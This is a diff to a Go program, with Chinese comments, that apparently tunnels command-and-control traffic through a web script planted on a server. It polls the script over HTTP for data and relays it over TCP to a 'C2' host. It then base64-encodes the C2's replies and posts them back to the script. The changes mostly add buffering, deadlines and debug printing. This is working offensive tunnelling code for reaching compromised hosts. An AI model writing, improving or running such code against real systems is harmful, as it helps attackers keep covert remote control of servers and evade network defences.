@@ -18,6 +18,7 @@ import (
 var (
 	addr   string
 	target string
+	// wg     sync.WaitGroup
 )
 
 // 获取数据模块
@@ -33,27 +34,40 @@ func GetDate(cli *cli.Context) {
 	resp.Body.Close()
 	if string(content[:15]) == "CONNECT SUCCESS" {
 		fmt.Println(string(content[:15]), "Start getting data ....")
+		// fmt.Println(reflect.TypeOf(client))
 		for {
 			dataResp, err := client.Post(url, "application/x-www-form-urlencoded", strings.NewReader("DataType=GetData"))
 			if err != nil {
 				panic(err)
 			}
 			data, _ := ioutil.ReadAll(dataResp.Body)
+			dataResp.Body.Close()
 			if string(data) == "NO DATA" {
-				dataResp.Body.Close()
 				continue
 			}
-			data, _ = base64.URLEncoding.DecodeString(string(data))
-			go SendDate(hostPort, data, url)
-			dataResp.Body.Close()
+			// data, _ = base64.URLEncoding.DecodeString(string(data))
+			// wg.Add(1)
+			// reg := regexp.MustCompile(`>|(.*)|<`)
+			// result := reg.FindAllStringSubmatch(string(data), -1)
+			fmt.Println("获取的数据")
+			// for _, text := range result {
+			// 	fmt.Println(text[1])
+			// }
+			fmt.Println(len(data))
+			fmt.Println(data)
+			SendDate(hostPort, data, url)
+			// wg.Wait()
 		}
 	} else {
 		fmt.Println("Please check if the script exists and runs...")
 	}
 }
 
+var dataBuf = make([]byte, 0, 1046616)
+
 // 数据发送模块
 func SendDate(hostPort string, data []byte, url string) {
+	// defer wg.Done()
 	conn, err := net.Dial("tcp", hostPort)
 	defer conn.Close()
 	if err != nil {
@@ -62,33 +76,65 @@ func SendDate(hostPort string, data []byte, url string) {
 	}
 	// b64Data, _ := base64.URLEncoding.DecodeString(data)
 	// base64.URLEncoding.EncodeToString()
-	fmt.Println("Send data to C2:", data)
+	// fmt.Println("Send data to C2:")
+	// fmt.Println("--------------------------------------------------------------")
+	// fmt.Println(string(data))
+	// fmt.Println("--------------------------------------------------------------")
+
 	_, err = conn.Write(data)
 	if err != nil {
 		fmt.Printf("write failed , err : %v\n", err)
 	}
 	for {
 		tmp := make([]byte, 1046616)
-		C2data, err := conn.Read(tmp)
-		if err != nil {
-			if err != io.EOF {
-				fmt.Println("read error:", err)
-			}
-		}
-		if C2data == 0 {
+		dataErr := conn.SetDeadline(time.Now().Add(1 * time.Second))
+		if dataErr != nil {
 			fmt.Println("End of getting data")
 			break
 		}
-		fmt.Println("Get data from C2")
-		fmt.Println(C2data)
-		C2Send := append([]byte("DataType=PostData&Data=TO:SEND"), tmp[:C2data]...)
-		client := &http.Client{Timeout: 5 * time.Second}
-		resp, err := client.Post(url, "application/x-www-form-urlencoded", bytes.NewBuffer(C2Send))
+		C2data, err := conn.Read(tmp)
+		dataBuf = append(dataBuf, tmp[:C2data]...)
 		if err != nil {
-			panic(err)
+			if err != io.EOF {
+				fmt.Println("read error:", err)
+				break
+			}
 		}
-		resp.Body.Close()
+		if C2data == 0 {
+			// fmt.Println("Get data from C2")
+			// fmt.Println(C2data)
+			fmt.Println("发送的数据")
+			fmt.Println(string(dataBuf))
+			C2Send := []byte("DataType=PostData&Data=TO:SEND" + base64.URLEncoding.EncodeToString(dataBuf))
+			client := &http.Client{Timeout: 5 * time.Second}
+			resp, err := client.Post(url, "application/x-www-form-urlencoded", bytes.NewBuffer(C2Send))
+			if err != nil {
+				panic(err)
+			}
+			resp.Body.Close()
+			dataBuf = append(dataBuf[:0])
+			fmt.Println("End of getting data")
+			// conn.Close()
+			break
+		}
+		// fmt.Println("Get data from C2")
+		// fmt.Println(C2data)
+		// fmt.Println("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
+		// fmt.Println("发送的数据")
+		// fmt.Println(string(tmp[:C2data]))
+		// fmt.Println("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
+		// fmt.Println(len(base64.URLEncoding.EncodeToString(tmp[:C2data])))
+		// fmt.Println(base64.URLEncoding.EncodeToString(tmp[:C2data]))
+
+		// conn.Close()
+		// phpdata, _ := ioutil.ReadAll(resp.Body)
+		// fmt.Println("xxx")
+		// fmt.Println(len(string(phpdata)))
+		// fmt.Println("Send to shell ok!")
+		// time.Sleep(1 * time.Second)
+		// break
 	}
+
 }
 
 // 主函数
